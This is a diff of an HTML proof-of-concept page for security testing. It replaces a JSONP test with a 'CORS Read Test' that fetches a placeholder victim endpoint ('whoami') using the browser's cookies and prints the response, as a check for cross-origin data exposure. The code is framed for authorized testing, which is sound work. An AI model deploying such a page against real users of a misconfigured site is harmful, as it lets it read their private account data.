@@ -1,27 +1,38 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
+  <body>
+    <h2>CORS Read Test</h2>
+    <button id="go">Fetch</button>
+    <pre id="out"></pre>
 
-<body>
-  <!--<h1>JSONP Behavior Test</h1>-->
+    <script>
+      // Replace with the API endpoint you are authorized to test
+      const TARGET = "https://victim.example.com/rest/user/whoami";
 
-  <script>
-async function test() {
-  const url = document.getElementById("url").value;
+      document.getElementById("go").onclick = async () => {
+        const out = document.getElementById("out");
+        out.textContent = "Fetching…";
 
-  try {
-    const r = await fetch(url, { credentials: "include" });
-    const text = await r.text(); // if CORS blocks, you won't get here
-    document.getElementById("out").textContent =
-      `SUCCESS\nStatus: ${r.status}\n\nFirst 500 chars:\n` + text.slice(0, 500);
-  } catch (e) {
-    document.getElementById("out").textContent =
-      `BLOCKED (this is normal if CORS not allowed)\n\n` + e;
-  }
-}
-</script>
+        try {
+          const res = await fetch(TARGET, {
+            method: "GET",
+            // IMPORTANT:
+            // If the endpoint relies on cookies, you need credentials: "include"
+            // If it uses Authorization: Bearer, the browser won't magically add it.
+            credentials: "include"
+          });
 
+          out.textContent =
+            "Status: " + res.status + "\n" +
+            "ACAO: " + res.headers.get("access-control-allow-origin") + "\n" +
+            "ACAC: " + res.headers.get("access-control-allow-credentials") + "\n\n";
 
-  <!-- Only works if the API supports JSONP -->
-  <script src="https://authorized-lab.example/api?callback=testCallback"></script>
-</body>
+          const text = await res.text();
+          out.textContent += text;
+        } catch (e) {
+          out.textContent = "Blocked / Error:\n" + e;
+        }
+      };
+    </script>
+  </body>
 </html>
